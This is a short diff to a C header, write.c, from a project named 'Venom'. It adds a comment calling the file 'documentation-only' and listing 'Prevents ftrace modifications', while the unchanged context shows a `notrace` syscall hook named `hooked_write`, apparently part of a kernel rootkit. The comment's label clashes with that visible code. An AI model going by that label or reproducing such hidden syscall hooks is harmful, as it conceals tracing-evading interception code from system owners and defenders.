@@ -1,3 +1,21 @@
+/*
+ * Venom 
+ * ---------------------------------------------------------------------------
+ * File: write.c
+ *
+ * Purpose:
+ *  - Conceptual discussion of the write(2) syscall, its interaction with
+ *    logging/tracing subsystems, and how output interception might appear
+ *    in system logs or forensic evidence.
+ *
+ * Contents (documentation-only):
+ *  - Prevents ftrace modifications
+ * 
+ * Author: Trevohack 
+ */
+
+
+
 #ifndef WRITE_H
 #define WRITE_H
 
@@ -52,3 +70,4 @@ notrace static asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
 }
 
 #endif 
+
